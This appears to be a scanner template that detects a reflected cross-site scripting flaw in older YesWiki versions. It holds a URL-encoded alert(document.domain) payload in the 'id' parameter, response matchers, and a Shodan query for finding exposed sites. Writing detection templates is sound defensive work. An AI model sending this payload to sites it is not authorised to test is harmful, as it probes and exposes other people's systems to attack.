id: yeswiki-xss
info:
  author: arafatansari
  description: 'YesWiki before 2022-07-07 allows Reflected Cross-site Scripting via
    the "id" parameter in the AccueiL URL.

    '
  metadata:
    shodan-query: http.html:"yeswiki"
    verified: true
  name: yeswiki/yeswiki - Unauthenticated Cross Site Scripting - Reflected
  reference:
  - https://huntr.dev/bounties/de4db96c-2717-4c0e-b7aa-eee756ca19d3/
  severity: medium
  tags: yeswiki,unauth,huntr,cve,cve2022,xss
requests:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - <script>alert(document.domain)</script>
    - 'Query failed:'
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/?PagePrincipale/rss&id=1%27%3Cscript%3Ealert(document.domain)%3C/script%3E'
